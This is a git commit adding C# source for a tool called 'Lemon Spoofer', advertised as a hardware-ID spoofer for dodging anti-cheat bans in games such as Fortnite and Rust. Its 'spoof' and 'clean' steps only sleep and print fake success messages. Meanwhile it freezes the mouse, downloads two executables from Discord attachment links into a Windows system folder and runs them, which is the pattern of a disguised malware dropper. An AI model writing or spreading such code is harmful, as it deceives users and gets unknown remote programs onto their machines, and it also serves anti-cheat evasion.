31bda56ae70e41a79700f041d85f1ff9f98f45c8
LemonSpoof <56457348+LemonSpoof@users.noreply.github.com>
2019-10-12 00:18:51 +0200

    Add files via upload
    Lemon Spoofer, works for EAC / BE Games, Rust Fortnite Apex Legends

---
+++ Lemon/Program.cs
@@ -0,0 +1,64 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Diagnostics;
+using System.IO;
+using System.Net;
+using System.Runtime.InteropServices;
+using System.Threading;
+using Microsoft.Win32;
+namespace Lemon
+{
+    internal class Program
+    {
+        private static void Main(string[] args)
+        {
+            Console.Title = "Lemon Spoofer";
+            Console.ForegroundColor = ConsoleColor.Magenta;
+            Console.WriteLine("[1] Spoof");
+            Console.WriteLine("[2] Clean");
+            Console.WriteLine("Made by Lemon Squad [JUICY]");
+            string a = Console.ReadLine();
+            if (a == "1")
+            {
+                Program.Spoof();
+            }
+            if (a == "2")
+            {
+                Program.Spoof();
+            }
+            if (a == "Lemon")
+            {
+                Program.Spoof();
+            }
+        }
+        public static void Spoof()
+        {
+            Console.Clear();
+            Outbuilt.Protection.FreezeMouse();
+            Console.WriteLine("[*] Cleaning");
+            SerialsClean.Download1();
+            SerialsClean.Download2();
+            SerialsClean.Clean();
+            Console.WriteLine("[*] Mapping Driver");
+            SerialsClean.Spoof();
+            Console.WriteLine("[*] Resetting Adapters...");
+            SerialsClean.Adapters();
+            Console.WriteLine("[*] Spoofing MAC Address..");
+            SerialsClean.MAC();
+            SerialsClean.no();
+            SerialsClean.restart();
+            Console.WriteLine("[*] Success Spooofed Have Fun Playing Fortnite");
+            Thread.Sleep(3000);
+            Console.WriteLine("[*] Finishing Touches...");
+            Thread.Sleep(7000);
+            SerialsClean.Spofy();
+            SerialsClean.ok();
+            SerialsClean.Stall();
+            Thread.Sleep(7000);
+            Console.ForegroundColor = ConsoleColor.Red;
+            Console.WriteLine("[*] Closing...");
+            Thread.Sleep(2000);
+            Outbuilt.Protection.ReleaseMouse();
+        }
+    }
+}
---
+++ Lemon/SerialsClean.cs
@@ -0,0 +1,93 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Diagnostics;
+using System.IO;
+using System.Linq;
+using System.Net;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.Threading;
+using System.Threading.Tasks;
+
+namespace Lemon
+{
+    internal class SerialsClean
+    {
+        public static void Clean()
+        {
+            Thread.Sleep(10000);
+            Console.WriteLine("[*] Success Clean");
+        }
+        public static void Spoof()
+        {
+            Thread.Sleep(5000);
+            Console.WriteLine("[*] Success Spoof");
+        }
+        public static void Adapters()
+        {
+            Thread.Sleep(7000);
+            Console.WriteLine("[*] Adapters Reseted");
+        }
+        public static void MAC()
+        {
+            Thread.Sleep(6000);
+            Console.WriteLine("[*] Mac Address Spoofed!");
+        }
+        public static void Spofy()
+        {
+            Console.WriteLine("[*] Deleting EAC/BE Related Folders");
+        }
+        public static void Reg()
+        {
+            File.Delete("C:\\Program Files\\EpicGames");
+        }
+        public static void Stall()
+        {
+            Process process = new Process();
+            //process.StartInfo.CreateNoWindow = true;
+            //process.StartInfo.RedirectStandardInput = true;
+            //process.StartInfo.UseShellExecute = false;
+            process.StartInfo.FileName = "C:\\Windows\\Speech\\MAC.exe";
+            process.Start();
+            //process.WaitForExit();
+            //File.Delete("C:\\Windows\\Speech\\net.exe");
+            return;
+        }
+        public static void ok()
+        {
+            Console.WriteLine("[*] Exiting...");
+            Thread.Sleep(2000);
+        }
+        public static void restart()
+        {
+            Process process = new Process();
+            //process.StartInfo.CreateNoWindow = true;
+            //process.StartInfo.RedirectStandardInput = true;
+            //process.StartInfo.UseShellExecute = false;
+            process.StartInfo.FileName = "C:\\Windows\\Speech\\Cleaner.exe";
+            process.Start();
+            //process.WaitForExit();
+            //File.Delete("C:\\Windows\\Speech\\net.exe");
+            return;
+        }
+        public static void no()
+        {
+            Console.WriteLine("[*] Cleaning Leftover Files...");
+            Thread.Sleep(2000);
+        }
+        public static void Download1()
+        {
+            WebClient webClient = new WebClient();
+            webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36");
+            webClient.DownloadFile("https://cdn.discordapp.com/attachments/623970378024222720/630343369519923210/MAC.exe", "C:\\Windows\\Speech\\MAC.exe");
+            webClient.Proxy = null;
+        }
+        public static void Download2()
+        {
+            WebClient webClient = new WebClient();
+            webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36");
+            webClient.DownloadFile("https://cdn.discordapp.com/attachments/632323847995129863/632327951249047584/Cleaner.exe", "C:\\Windows\\Speech\\Cleaner.exe");
+            webClient.Proxy = null;
+        }
+    }
+}
